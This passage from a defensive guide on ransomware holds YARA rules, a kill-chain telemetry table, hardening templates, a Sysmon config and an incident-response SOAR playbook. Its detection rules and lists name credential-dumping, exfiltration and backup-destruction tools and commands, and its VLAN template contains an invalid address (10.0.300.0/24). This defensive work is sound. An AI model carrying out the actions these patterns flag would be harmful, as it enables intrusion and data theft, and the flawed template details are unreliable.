        $crypto3 = "CryptEncrypt" ascii

    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        (
            (2 of ($note*) and 1 of ($vss*)) or
            (1 of ($note*) and 1 of ($vss*) and 1 of ($recovery*)) or
            (2 of ($vss*, $recovery*) and 2 of ($kill*) and 1 of ($crypto*))
        )
}
```

#### Cobalt Strike Beacon In-Memory Detection

This rule targets Cobalt Strike Beacon in process memory, identifying the characteristic configuration block, sleep mask routine, and named pipe patterns. It should be used for memory scanning during incident response, not file-based scanning (Beacon is typically reflectively loaded and never touches disk).

```
rule CobaltStrike_Beacon_Memory {
    meta:
        description = "Detects Cobalt Strike Beacon in process memory"
        author = "Threat Intelligence"
        date = "2025-05-08"
        severity = "critical"
    strings:
        // Beacon config block markers (XOR-decoded)
        $config_header = { 00 01 00 01 00 02 }
        // Default named pipe patterns
        $pipe1 = "\\\\.\\pipe\\msagent_" ascii
        $pipe2 = "\\\\.\\pipe\\postex_" ascii
        $pipe3 = "\\\\.\\pipe\\status_" ascii
        $pipe4 = "\\\\.\\pipe\\MSSE-" ascii
        // Reflective loader signature
        $reflective = { 4D 5A 41 52 55 48 89 E5 }
        // Sleep mask function pattern
        $sleep_mask = { 48 8B ?? 48 31 ?? 48 89 ?? 49 89 }
        // Beacon commands table
        $cmd_table = { 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 }
    condition:
        2 of ($pipe*) or
        ($reflective and $sleep_mask) or
        ($config_header and $cmd_table)
}
```

#### Packed and Obfuscated Loader Detection

Ransomware affiliates frequently deliver their payloads through packed or obfuscated loaders that unpack the final payload in memory. These loaders share common characteristics: high-entropy PE sections (indicating packed/encrypted content), minimal import tables limited to dynamic loading APIs (`LoadLibraryA`, `GetProcAddress`), and known packer section names. This rule detects the loader stage before the ransomware payload is unpacked.

```
rule Packed_Obfuscated_Loader {
    meta:
        description = "Detects packed or obfuscated PE loaders commonly used to deliver ransomware payloads"
        author = "Threat Intelligence"
        date = "2025-05-08"
        severity = "high"
    strings:
        // Dynamic loading APIs (minimal import table indicator)
        $api_load = "LoadLibraryA" ascii
        $api_proc = "GetProcAddress" ascii
        $api_virtual = "VirtualAlloc" ascii
        $api_protect = "VirtualProtect" ascii

        // Common packer section names
        $upx0 = "UPX0" ascii
        $upx1 = "UPX1" ascii
        $themida = ".themida" ascii
        $vmprotect = ".vmp" ascii
        $aspack = ".aspack" ascii
        $enigma = ".enigma" ascii
        $mpress = ".MPRESS" ascii

        // Self-modifying code patterns (common in custom packers)
        $xor_loop = { 80 3? ?? 74 ?? 80 3? ?? 46 EB }  // XOR decode loop
        $rc4_init = { C7 [2-4] 00 01 00 00 }             // RC4 key schedule init (256)

    condition:
        uint16(0) == 0x5A4D and
        filesize < 2MB and
        (
            // Known packer signatures
            (1 of ($upx*, $themida, $vmprotect, $aspack, $enigma, $mpress)) or
            // Custom packer: minimal imports + high entropy section + decode loop
            (
                $api_load and $api_proc and
                ($api_virtual or $api_protect) and
                ($xor_loop or $rc4_init) and
                // PE has a section with entropy > 7.0 (approximated by large raw size with small virtual size ratio)
                math.entropy(0, filesize) > 6.5
            )
        )
}
```

### 7.5 Artifacts Table — Kill Chain Phase to Telemetry Mapping

The following table maps each kill chain phase to the specific telemetry sources required for detection. This serves as a coverage assessment tool: if your environment lacks collection for any listed source, that phase has a detection blind spot.

| Kill Chain Phase | Sysmon Event IDs | Windows Security EIDs | EDR Telemetry | Network Logs | Filesystem Artifacts |
|---|---|---|---|---|---|
| **Initial Access — Appliance Exploit** | — | — | — | Appliance syslogs, WAF logs, VPN session logs | Modified appliance binaries, web shells |
| **Initial Access — Stolen Creds** | — | 4624, 4625, 4768 | Identity analytics | VPN logs, conditional access logs | — |
| **Execution — PsExec** | EID 1 (process), 13 (registry), 17/18 (pipes) | 7045 (service install), 4697 | Process tree, service creation | SMB (445) to ADMIN$ | Service binary in %SystemRoot% |
| **Execution — WMI** | EID 1 (wmiprvse.exe child) | 5857, 5860, 5861, 4688 | Process tree under wmiprvse | DCOM (135) + RPC dynamic | — |
| **Execution — Scheduled Task** | EID 1 (schtasks.exe) | 4698 (created), 4699 (deleted), 4702 (updated) | Task creation telemetry | — | XML task definition in %System32%\Tasks\ |
| **Persistence — RMM Tool** | EID 1 (installer), 11 (file create), 3 (network) | 7045 (service install) | Process execution, network conn | HTTPS to RMM vendor domains | RMM binaries, config files, service entries |
| **Persistence — C2 Beacon** | EID 1, 3, 17/18 (named pipes), 22 (DNS) | — | Network connections, DNS queries | DNS queries, HTTPS to C2, JA3 hashes | Beacon config in memory |
| **Reconnaissance — AD Enum** | EID 1 (SharpHound), 3 (LDAP connections) | 4624 (Type 3 for SAM-R enum) | LDAP query volume | LDAP (389/636) burst from single source | SharpHound ZIP output |
| **Credential Access — LSASS** | EID 10 (process access to lsass.exe) | — | LSASS access events | — | lsass.dmp, comsvcs.dll minidump |
| **Credential Access — DCSync** | — | 4662 (replication GUIDs) | Replication request from non-DC | MS-DRSR RPC traffic from non-DC IP | — |
| **Credential Access — Kerberoast** | — | 4769 (RC4 TGS requests) | TGS request anomalies | Kerberos (88) traffic analysis | Cracked hashes (post-compromise) |
| **Lateral Movement — RDP** | EID 1 (mstsc.exe), 3 (3389 conn) | 4624 (Type 10), 4778, 4779 | RDP session events | TCP 3389 between workstations | RDP bitmap cache, jump list entries |
| **Lateral Movement — WinRM** | EID 1 (wsmprovhost.exe children) | 4624 (Type 3), 4104 (PS script block) | PowerShell remoting events | TCP 5985/5986 between hosts | PowerShell transcript logs |
| **Defense Evasion — EDR Tamper** | EID 6 (driver load) | — | Agent health heartbeat loss | — | Vulnerable driver files on disk |
| **Exfiltration** | EID 1 (rclone, MEGAcmd), 3 (outbound conn) | — | Process + network correlation | Proxy logs, NetFlow byte counts, DNS | rclone.conf, archive staging files |
| **Impact — Encryption** | EID 11 (mass file create), 1 (encryptor process) | 1102 (log clear) | Mass file modification, entropy change | — | Ransom notes, encrypted files, modified wallpaper |
| **Impact — Backup Destruction** | EID 1 (vssadmin, wmic, bcdedit) | — | VSS deletion commands | Connections to Veeam/backup servers | Deleted shadow copies, modified boot config |

### 7.6 Response Priorities

When ransomware indicators are detected mid-chain, response must be immediate and aggressive. The goal is containment—preventing the affiliate from deploying the encryptor—not investigation. Investigation happens after containment.

Priority actions upon confirmed ransomware affiliate activity:

1. **Network isolation:** Immediately isolate the compromised hosts from the network. EDR solutions with network containment features (CrowdStrike's "contain host," SentinelOne's "disconnect from network") can do this in seconds. For hosts without EDR network containment, disable the switch port.

2. **Credential reset:** Reset the passwords of all accounts known or suspected to be compromised, particularly domain admin accounts. If DCSync has been detected, reset the `krbtgt` account password twice (the second reset invalidates all existing TGTs).

3. **Backup verification:** Immediately verify the integrity and availability of backup infrastructure. If backups have not been compromised, the organization can recover from encryption without paying. If the affiliate is still in the environment and has not yet destroyed backups, isolate the backup infrastructure immediately.

4. **Kill switch:** Some ransomware families check for the presence of specific files or mutex names before executing. LockBit 3.0 creates a mutex based on the machine GUID; if the mutex already exists (indicating encryption is already running or has been completed), it exits. This is not a reliable defense but can buy time on individual hosts.

---

## 8. Architectural Defenses: Making the Chain Harder

Individual detections catch individual techniques. Architectural defenses make entire attack chain phases infeasible or dramatically harder. These are the high-leverage investments for an enterprise defending against ransomware.

### 8.1 Network Segmentation and Microsegmentation

The affiliate's lateral movement depends on flat networks where any host can reach any other host on common protocols (SMB 445, RDP 3389, WinRM 5985). Proper segmentation breaks this assumption.

At minimum: segment workstations from servers, segment servers by function (domain controllers, file servers, application servers), restrict RDP to jump boxes, restrict SMB to necessary paths (domain controllers, file servers), and restrict WinRM to administrative hosts. Zero trust network architectures (see Domain 31 Chapter 31B) replace implicit trust based on network location with per-request authentication and authorization, dramatically limiting lateral movement even for an attacker with valid credentials.

### 8.2 Identity Hardening

**FIDO2/WebAuthn MFA everywhere.** This is the single highest-ROI security investment. Phishing-resistant MFA on VPN, email, cloud services, and privileged access eliminates credential replay as an initial access vector.

**Tiered administrative model.** Domain admin credentials must never be used on workstations. Implement a tiered model (Microsoft's Enhanced Security Administrative Environment / ESAE or its successor, the Privileged Access Model): Tier 0 credentials (domain admin, DC admin) are used only on Tier 0 assets (domain controllers) from dedicated Privileged Access Workstations (PAWs). Tier 1 credentials (server admin) are used only on servers. Tier 2 credentials (workstation admin) are used only on workstations. If a workstation is compromised, the attacker obtains only Tier 2 credentials, which cannot access servers or domain controllers.

**Credential Guard and LSA protection.** Windows Credential Guard uses Virtualization-Based Security (VBS) to isolate LSASS secrets in a protected environment inaccessible to the kernel. This prevents Mimikatz-style LSASS credential dumping. LSA protection (RunAsPPL) configures LSASS as a Protected Process Light, preventing unsigned code from reading its memory. Enable both.

### 8.3 Backup Architecture

**3-2-1-1-0 rule:** Three copies of data, on two different media types, one offsite, one immutable/air-gapped, zero backup verification errors. The "one immutable" element is the critical addition: at least one copy of backups must be stored in a system that enforces immutability—meaning not even a backup administrator can delete the data before the retention period expires.

Implementation options: AWS S3 Object Lock in Compliance mode (cannot be overridden by any IAM principal, including the root account), Azure Blob Storage with immutable containers, purpose-built immutable backup appliances (ExaGrid, Cohesity with DataLock), or physically air-gapped tape with offsite vaulting.

Test recovery regularly. A backup that has never been tested is not a backup; it is an untested hypothesis.

### 8.4 Vulnerability Management for Perimeter Devices

Internet-facing appliances (VPN, firewall, email gateway, file transfer) are the primary initial access vector. These devices must receive the highest-priority patching—within 24–48 hours of a critical vulnerability disclosure, not within the standard 30-day patch cycle. Maintain an accurate inventory of all internet-facing assets (including shadow IT) via external attack surface management (EASM) tools (Censys, Shodan, Microsoft Defender External Attack Surface Management, CrowdStrike Falcon Surface).

### 8.5 Application Control and LOLBin Restriction

Application control policies (Windows Defender Application Control / WDAC, or AppLocker) that restrict execution to approved binaries prevent the affiliate from running their tools (Cobalt Strike, Mimikatz, rclone, 7-Zip, unauthorized RMM agents). WDAC in enforced mode is the strongest control, as it operates at the kernel level and cannot be bypassed by a local administrator.

LOLBin restrictions—blocking or alerting on the use of legitimate Windows tools for malicious purposes—require careful tuning. Block PsExec execution on workstations (it is almost never legitimate on a non-admin workstation). Alert on `certutil.exe` used with `-urlcache` or `-encode` flags (common for file download and encoding). Alert on `mshta.exe` executing remote scripts. Alert on `wmic.exe shadowcopy delete`. See the LOLBAS project (lolbas-project.github.io) for the full catalog.

### 8.6 Hardening Configurations

The architectural defenses described in §8.1–§8.5 require specific technical implementations. This section provides deployable configuration templates for the most impactful hardening measures.

#### Windows GPO Templates for Ransomware Defense

The following Group Policy settings address the most commonly exploited lateral movement and credential theft vectors. These should be deployed via a dedicated "Ransomware Hardening" GPO linked at the domain level, with WMI filters to exclude systems that legitimately require the restricted functionality.

Disabling PsExec on workstations prevents the most common lateral movement mechanism. PsExec requires the Server service and the `ADMIN$` share. Rather than disabling the Server service entirely (which breaks legitimate file sharing), restrict access to administrative shares on workstations.

```powershell
# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# "Network access: Shares that can be accessed anonymously" = (empty)
# "Network access: Restrict anonymous access to Named Pipes and Shares" = Enabled

# Restrict administrative shares on workstations (not servers)
# GPO: Computer Configuration > Preferences > Windows Settings > Registry
# Key: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
# Value: AutoShareWks (REG_DWORD) = 0

# Disable remote service creation on workstations via firewall rule
# GPO: Computer Configuration > Windows Settings > Security Settings > Windows Firewall
# Inbound Rule: Block TCP 445 from non-admin subnets to workstation subnets
```

Restricting WMI remote access prevents `wmiexec`-based lateral movement. The WMI namespace security can be tightened to allow only specific service accounts.

```powershell
# Restrict WMI remote access via DCOM permissions
# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# "DCOM: Machine Access Restrictions" — remove "Everyone" and "Anonymous Logon"
# Allow only: Domain Admins, specific management service accounts

# Disable WinRM on workstations where it is not needed
# GPO: Computer Configuration > Administrative Templates > Windows Components > Windows Remote Management
# "Allow remote server management through WinRM" = Disabled (on workstations)
```

Blocking LLMNR and NBT-NS eliminates poisoning attacks that capture NTLMv2 hashes on the local network (used by Responder/Inveigh during credential harvesting).

```powershell
# Disable LLMNR
# GPO: Computer Configuration > Administrative Templates > Network > DNS Client
# "Turn off multicast name resolution" = Enabled

# Disable NBT-NS via registry (deployed via GPO Preferences)
# Key: HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\Tcpip_*
# Value: NetbiosOptions (REG_DWORD) = 2
```

#### WDAC Policy for Blocking Unsigned Executables

Windows Defender Application Control (WDAC) is the strongest application control mechanism on Windows, operating at the kernel level via the Code Integrity subsystem. A properly configured WDAC policy prevents the execution of unsigned binaries, blocking ransomware encryptors, Cobalt Strike loaders, Mimikatz, and most offensive tooling. The following is a base policy that trusts Microsoft-signed binaries and a specific internal signing certificate.

```powershell
# Create a base WDAC policy from the DefaultWindows template
# This trusts Windows components and Microsoft-signed applications
New-CIPolicy -FilePath "C:\policies\BasePolicy.xml" `
    -Level Publisher `
    -Fallback Hash `
    -UserPEs `
    -MultiplePolicyFormat

# Add a rule for your organization's code-signing certificate
Add-SignerRule -FilePath "C:\policies\BasePolicy.xml" `
    -CertificatePath "C:\certs\OrgCodeSign.cer" `
    -Kernel -User -Update

# Set the policy to enforced mode (Audit mode first for testing)
Set-RuleOption -FilePath "C:\policies\BasePolicy.xml" -Option 3 -Delete  # Remove Audit Mode

# Convert to binary and deploy
ConvertFrom-CIPolicy -XmlFilePath "C:\policies\BasePolicy.xml" `
    -BinaryFilePath "C:\policies\{PolicyGUID}.cip"

# Deploy via GPO:
# Computer Configuration > Administrative Templates > System > Device Guard
# "Deploy Windows Defender Application Control" = Enabled
# Policy file path: \\domain\SYSVOL\...\{PolicyGUID}.cip
```

#### Attack Surface Reduction (ASR) Rules

ASR rules provide targeted behavioral blocking for specific attack techniques without the complexity of full WDAC deployment. The following rules address ransomware-relevant behaviors. Deploy in Audit mode first (value `2`), then switch to Block mode (value `1`) after validating no legitimate processes are affected.

```powershell
# Deploy ASR rules via PowerShell (or GPO/Intune)
# Block executable content from email client and webmail
Add-MpPreference -AttackSurfaceReductionRules_Ids BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 -AttackSurfaceReductionRules_Actions Enabled

# Block Office applications from creating executable content
Add-MpPreference -AttackSurfaceReductionRules_Ids 3B576869-A4EC-4529-8536-B80A7769E899 -AttackSurfaceReductionRules_Actions Enabled

# Block Office applications from injecting code into other processes
Add-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 -AttackSurfaceReductionRules_Actions Enabled

# Block credential stealing from LSASS (overlaps with Credential Guard)
Add-MpPreference -AttackSurfaceReductionRules_Ids 9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2 -AttackSurfaceReductionRules_Actions Enabled

# Block process creations from PsExec and WMI commands
Add-MpPreference -AttackSurfaceReductionRules_Ids D1E49AAC-8F56-4280-B9BA-993A6D77406C -AttackSurfaceReductionRules_Actions Enabled

# Block persistence through WMI event subscription
Add-MpPreference -AttackSurfaceReductionRules_Ids E6DB77E5-3DF2-4CF1-B95A-636979351E5B -AttackSurfaceReductionRules_Actions Enabled
```

#### Credential Guard and LAPS Deployment

Credential Guard isolates LSASS secrets using Virtualization-Based Security (VBS), making Mimikatz-style credential dumping ineffective. LAPS (Local Administrator Password Solution) randomizes local admin passwords per machine, preventing pass-the-hash attacks from spreading via shared local admin credentials.

```powershell
# Enable Credential Guard via GPO:
# Computer Configuration > Administrative Templates > System > Device Guard
# "Turn On Virtualization Based Security" = Enabled
# Select Platform Security Level: Secure Boot and DMA Protection
# Credential Guard Configuration: Enabled with UEFI lock

# Verify Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -Property *VirtualizationBased*

# Deploy Windows LAPS (built into Windows 11 23H2+ and Server 2025)
# GPO: Computer Configuration > Administrative Templates > System > LAPS
# "Configure password backup directory" = Active Directory
# "Password Settings" = Complexity: Large letters + small letters + numbers + specials
#                        Length: 24, Age: 30 days
```

#### Network Segmentation Template — AD Tier Model

The following VLAN and firewall rule template implements the Microsoft tier model for Active Directory, preventing credential theft on workstations from reaching domain controllers. The key principle is that higher-tier (less privileged) networks cannot initiate connections to lower-tier (more privileged) networks except through explicitly allowed administrative paths.

```
# VLAN Assignment
VLAN 10  - Tier 0: Domain Controllers, AD FS, PKI CA          (10.0.10.0/24)
VLAN 20  - Tier 0: Privileged Access Workstations (PAWs)       (10.0.20.0/24)
VLAN 30  - Tier 1: Member Servers (file, app, database)        (10.0.30.0/24)
VLAN 40  - Tier 1: Server Administration Jump Boxes             (10.0.40.0/24)
VLAN 100 - Tier 2: Corporate Workstations                       (10.0.100.0/22)
VLAN 200 - Tier 2: Guest / BYOD                                 (10.0.200.0/24)
VLAN 250 - DMZ: Internet-facing services                        (10.0.250.0/24)
VLAN 300 - Backup: Isolated backup infrastructure                (10.0.300.0/24)

# Core Firewall Rules (deny-default, allow-specific)
# Tier 2 (workstations) -> Tier 0 (DCs): DENY ALL except:
#   ALLOW TCP 88 (Kerberos), 389/636 (LDAP/LDAPS), 53 (DNS), 445 (SYSVOL/GPO)
#   DENY TCP 3389 (RDP), 5985/5986 (WinRM), 135 (RPC) to Tier 0

# Tier 2 -> Tier 1 (servers): DENY ALL except:
#   ALLOW application-specific ports (e.g., TCP 443 for web apps, 1433 for SQL)
#   DENY TCP 445 (SMB), 3389 (RDP), 5985/5986 (WinRM) to Tier 1

# Tier 0 PAWs -> Tier 0 DCs: ALLOW RDP (3389), WinRM (5985/5986), RPC (135)
# Tier 1 Jump Boxes -> Tier 1 Servers: ALLOW RDP (3389), WinRM (5985/5986)

# Backup VLAN: DENY ALL inbound except from backup agents (pull model)
#   Backup server initiates connections TO production (pull backups)
#   Production CANNOT initiate connections to backup VLAN
#   Backup VLAN has NO outbound internet access
```

#### Backup Architecture — 3-2-1-1-0 Implementation

The 3-2-1-1-0 rule (§8.3) requires at least one immutable copy. The following architecture implements this with specific technology choices that prevent ransomware affiliates from destroying backups even with domain admin credentials.

```
# Backup Architecture Diagram (Logical)
#
# Production Environment          Backup Environment (Separate AD forest or standalone)
# ┌─────────────────┐             ┌──────────────────────────────────┐
# │  File Servers    │────push───>│  Backup Server (Veeam/Commvault) │
# │  App Servers     │  (agent)   │  - Separate admin credentials    │
# │  Databases       │            │  - NOT domain-joined to prod AD  │
# │  VMs (ESXi)      │            │  - Hardened OS, no RDP from prod │
# └─────────────────┘             └──────────┬───────────────────────┘
#                                             │
#                              ┌──────────────┼──────────────┐
#                              │              │              │
#                              ▼              ▼              ▼
#                     ┌──────────────┐ ┌────────────┐ ┌────────────────┐
#                     │ Copy 1: NAS  │ │ Copy 2: S3 │ │ Copy 3: Tape   │
#                     │ (on-prem,    │ │ Object Lock│ │ (air-gapped,   │
#                     │  mutable)    │ │ Compliance │ │  offsite vault)│
#                     │              │ │ (immutable) │ │ (immutable)    │
#                     └──────────────┘ └────────────┘ └────────────────┘
#
# S3 Object Lock Compliance Mode: Even the AWS root account cannot
# delete objects before the retention period expires.
# Tape: Physically disconnected from the network. Courier to offsite vault.
```

#### Sysmon Configuration for Ransomware TTP Detection

The following Sysmon configuration excerpt targets the specific TTPs described in this chapter. It should be merged with the organization's existing Sysmon configuration (e.g., SwiftOnSecurity's or Olaf Hartong's sysmon-modular config) rather than deployed standalone. The configuration enables the event types referenced in the Sigma rules of §7.3 and the artifacts table in §7.5.

```xml
<!-- Sysmon configuration excerpt targeting ransomware TTPs -->
<!-- Merge with existing base config — do not deploy standalone -->
<Sysmon schemaversion="4.90">
  <EventFiltering>

    <!-- EID 1: Process Creation — capture command lines for all processes -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="include">
        <!-- Credential harvesting tools -->
        <Image condition="contains any">mimikatz;rubeus;sharphound;procdump;nanodump</Image>
        <!-- Lateral movement tools -->
        <Image condition="contains any">psexec;wmic;schtasks;sc.exe;tscon</Image>
        <!-- Exfiltration tools -->
        <Image condition="contains any">rclone;megacmd;7z.exe;rar.exe</Image>
        <!-- Defense evasion -->
        <Image condition="contains any">vssadmin;bcdedit;wbadmin;cipher</Image>
        <!-- LOLBins used in ransomware chains -->
        <Image condition="contains any">certutil;mshta;regsvr32;rundll32;msiexec</Image>
        <!-- PowerShell with encoded commands -->
        <CommandLine condition="contains any">-enc;-encodedcommand;FromBase64;IEX;Invoke-Expression</CommandLine>
      </ProcessCreate>
    </RuleGroup>

    <!-- EID 3: Network Connection — capture C2 and lateral movement connections -->
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <!-- C2 callback ports -->
        <DestinationPort condition="is any">443;8443;8080;4443</DestinationPort>
        <!-- Lateral movement ports -->
        <DestinationPort condition="is any">445;135;5985;5986;3389</DestinationPort>
      </NetworkConnect>
    </RuleGroup>

    <!-- EID 6: Driver Loaded — detect BYOVD attacks -->
    <RuleGroup name="DriverLoad" groupRelation="or">
      <DriverLoad onmatch="include">
        <Signed condition="is">false</Signed>
      </DriverLoad>
    </RuleGroup>

    <!-- EID 10: Process Access — detect LSASS credential dumping -->
    <RuleGroup name="ProcessAccess" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
      </ProcessAccess>
    </RuleGroup>

    <!-- EID 11: File Create — detect ransom notes and staging -->
    <RuleGroup name="FileCreate" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains any">README;DECRYPT;RESTORE;RECOVER;ransom</TargetFilename>
        <TargetFilename condition="end with any">.locked;.encrypted;.crypt</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- EID 17/18: Named Pipe — detect Cobalt Strike and PsExec pipes -->
    <RuleGroup name="PipeEvent" groupRelation="or">
      <PipeEvent onmatch="include">
        <PipeName condition="contains any">msagent_;postex_;MSSE-;status_;svcctl</PipeName>
      </PipeEvent>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

---

## 9. Ransomware Incident Response Playbook

This section provides an operational reference for incident response teams handling an active ransomware incident. It complements the broader IR methodology in Domain 24 Chapter 24A with ransomware-specific procedures.

### 9.1 Immediate Actions (First 60 Minutes)

**Determine scope:** How many hosts are encrypted? Is encryption still ongoing? Is the encryptor still running on any hosts? Check EDR console for active ransomware process detections. If encryption is ongoing, the priority is stopping the spread, not investigating the root cause.

**Contain:** Isolate encrypted and suspected-compromised hosts via EDR network containment or switch port disablement. If the entire environment is affected, consider isolating the environment from the internet (to prevent further data exfiltration and C2 communication) while maintaining internal connectivity needed for response operations. Do not shut down encrypted hosts—volatile memory may contain the encryption key or other forensic artifacts.

**Preserve evidence:** Capture memory dumps from encrypted hosts before they are rebooted. The per-file symmetric encryption keys may still be in process memory if the encryptor is still running or has recently terminated. Memory dumps have enabled decryption without paying in some incidents.

**Identify the family:** The ransom note, file extension, and wallpaper typically identify the ransomware family. Cross-reference with ID Ransomware (id-ransomware.malwarehunterteam.com) or No More Ransom (nomoreransom.org) to check for available decryptors.

**Check for decryptor availability:** Before assuming payment is the only option, check: No More Ransom project, CISA/FBI advisories, and vendor-specific tools (Avast, Emsisoft, Kaspersky, Bitdefender have released free decryptors for some families). The Rhysida decryptor case (Section 5.7) demonstrates that implementation flaws can make decryption possible.

### 9.2 Investigation Phase

**Identify initial access:** Work backward from the earliest encrypted host. Examine authentication logs for the account that deployed the encryptor. Trace that account's activity backward to identify when it was compromised. Examine VPN/RDP logs for anomalous external access. Check DNS logs for known malware C2 domains. Review email logs for phishing delivery. The initial access vector determines the remediation actions required to prevent re-compromise.

**Determine data exposure:** Did the attacker exfiltrate data before encryption? Review proxy and firewall logs for large outbound transfers, rclone execution, and connections to cloud storage services. Review file server access logs for bulk file access. The answer determines whether the incident is a data breach requiring regulatory notification, not just a business disruption event.

**Assess backup integrity:** Verify that backup data is intact, accessible, and restorable. Test restoration on isolated systems. If backups are compromised, assess whether any offline or immutable copies exist.

### 9.3 Recovery

Rebuild rather than decrypt where possible. Encrypted hosts should be reimaged from known-good media, not "cleaned" (the attacker may have left additional backdoors beyond the encryptor). Restore data from verified backups. Reset all credentials domain-wide (every user, every service account, every administrator). Rebuild domain controllers from clean media if DCSync or NTDS.DIT theft is suspected. Patch the initial access vector before restoring internet connectivity.

### 9.4 Payment Decision Framework

The decision to pay a ransom is a business decision, not a technical one, but the IR team must provide the technical inputs:

Can we recover from backups? If yes, payment is unnecessary. Has data been exfiltrated? If yes, paying may prevent data publication—but there is no guarantee, and payment funds future criminal operations. Is a free decryptor available? Is the group known to provide working decryptors? (Some groups are "reliable" in providing working decryptors after payment; others have a track record of providing faulty or partial decryptors.) Is the group sanctioned by OFAC? Payment to sanctioned entities may violate U.S. law regardless of the circumstance.

CISA, FBI, and international law enforcement agencies uniformly recommend against paying ransoms, but they also acknowledge that each organization must make this decision based on its specific circumstances.

### 9.5 SOAR Playbook for Ransomware Response

A SOAR (Security Orchestration, Automation, and Response) playbook for ransomware converts the manual IR procedures in §9.1–§9.4 into automated and semi-automated workflows that execute within seconds of alert triggering. The following playbook is designed for platforms like Palo Alto XSOAR, Splunk SOAR (Phantom), or Microsoft Sentinel with Logic Apps, but the workflow logic is platform-agnostic.

#### Stage 1 — Automated Containment (0–5 minutes, fully automated)

When a high-confidence ransomware indicator fires (Sigma rules from §7.3 at `critical` level, or EDR ransomware-specific detections), the SOAR platform executes immediate containment without waiting for analyst approval. The rationale is that the cost of a false-positive containment (temporary isolation of a legitimate host) is dramatically lower than the cost of delayed containment allowing encryption to spread.

```python
# SOAR Playbook — Stage 1: Automated Containment
# Trigger: Critical ransomware Sigma rule fires or EDR ransomware detection

def stage1_containment(alert):
    """Immediate automated containment actions upon ransomware detection."""
    affected_host = alert.hostname
    affected_user = alert.username

    # 1. Network isolation via EDR API
    # CrowdStrike example — adapt to your EDR vendor
    edr_api.contain_host(
        hostname=affected_host,
        isolation_level="full",   # Block all network except EDR telemetry
        note=f"Automated containment: ransomware indicator {alert.rule_id}"
    )

    # 2. Disable the compromised user account in Active Directory
    ad_api.disable_account(
        username=affected_user,
        reason="Ransomware containment — automated"
    )

    # 3. Block attacker C2 IPs/domains at the perimeter firewall
    if alert.destination_ip:
        firewall_api.add_block_rule(
            ip=alert.destination_ip,
            direction="outbound",
            comment=f"Ransomware C2 block — alert {alert.id}"
        )

    # 4. Force-expire all Kerberos tickets for the affected user
    ad_api.reset_password(username=affected_user, force_logoff=True)

    # 5. Trigger evidence preservation (Stage 2)
    trigger_stage2(affected_host, alert)
```

#### Stage 2 — Evidence Preservation (5–15 minutes, automated)

Before any investigation or remediation alters the state of compromised systems, volatile evidence must be captured. Memory dumps are the highest priority because they may contain encryption keys, C2 configuration, and credential material that is lost on reboot.

```python
def stage2_evidence_preservation(host, alert):
    """Automated evidence collection from contained host."""

    # 1. Capture volatile memory dump via EDR live response
    # Memory dump is critical — may contain encryption keys
    edr_api.live_response(
        hostname=host,
        command="memdump",
        output_path=f"\\\\forensics-share\\{alert.id}\\{host}_memdump.raw"
    )

    # 2. Collect critical event logs before they are overwritten
    logs_to_collect = [
        "Security", "System", "Application",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-WinRM/Operational",
        "Microsoft-Windows-TaskScheduler/Operational"
    ]
    for log in logs_to_collect:
        edr_api.live_response(
            hostname=host,
            command=f"wevtutil epl {log} C:\\temp\\{log.replace('/', '_')}.evtx",
            retrieve_file=f"C:\\temp\\{log.replace('/', '_')}.evtx",
            output_path=f"\\\\forensics-share\\{alert.id}\\{host}_logs\\"
        )

    # 3. Collect filesystem artifacts
    artifacts = [
        "C:\\Windows\\Prefetch\\*",                    # Execution history
        "C:\\Windows\\System32\\winevt\\Logs\\*",      # All event logs
        "C:\\Users\\*\\AppData\\Local\\Temp\\*",       # Temp files (tools, staging)
        "C:\\Users\\*\\AppData\\Roaming\\*\\rclone*",  # Exfiltration config
    ]
    for pattern in artifacts:
        edr_api.live_response(
            hostname=host,
            command=f"collect {pattern}",
            output_path=f"\\\\forensics-share\\{alert.id}\\{host}_artifacts\\"
        )

    # 4. Create forensic disk image if encryption has not started
    # (If encryption is active, memory dump is more urgent than disk image)
    if not alert.encryption_detected:
        trigger_disk_image(host, alert)
```

#### Stage 3 — IOC Extraction and Enrichment (15–30 minutes, semi-automated)

Extracted IOCs from the contained host are automatically enriched against threat intelligence feeds and used to scope the incident — identifying other compromised hosts that share the same IOCs.

```python
def stage3_ioc_enrichment(alert, evidence):
    """Extract and enrich IOCs from collected evidence."""

    iocs = {
        "ip_addresses": extract_ips_from_logs(evidence.network_logs),
        "domains": extract_domains_from_dns(evidence.dns_logs),
        "file_hashes": extract_hashes_from_filesystem(evidence.artifacts),
        "user_accounts": extract_accounts_from_auth_logs(evidence.security_log),
        "service_names": extract_services(evidence.system_log),
    }

    # Enrich each IOC against threat intelligence
    enriched = {}
    for ioc_type, ioc_list in iocs.items():
        for ioc in ioc_list:
            enriched[ioc] = {
                "virustotal": vt_api.lookup(ioc),
                "otx_alienvault": otx_api.lookup(ioc),
                "abuse_ipdb": abuseipdb_api.lookup(ioc) if ioc_type == "ip_addresses" else None,
                "internal_sightings": siem_api.search(ioc, timerange="30d"),
            }

    # Scope the incident — find other hosts with the same IOCs
    compromised_hosts = set()
    for ioc, intel in enriched.items():
        if intel["internal_sightings"]:
            for sighting in intel["internal_sightings"]:
                compromised_hosts.add(sighting.hostname)

    # If additional hosts found, trigger containment for each
    for host in compromised_hosts:
        if host != alert.hostname:
            stage1_containment(create_alert(host, parent=alert))

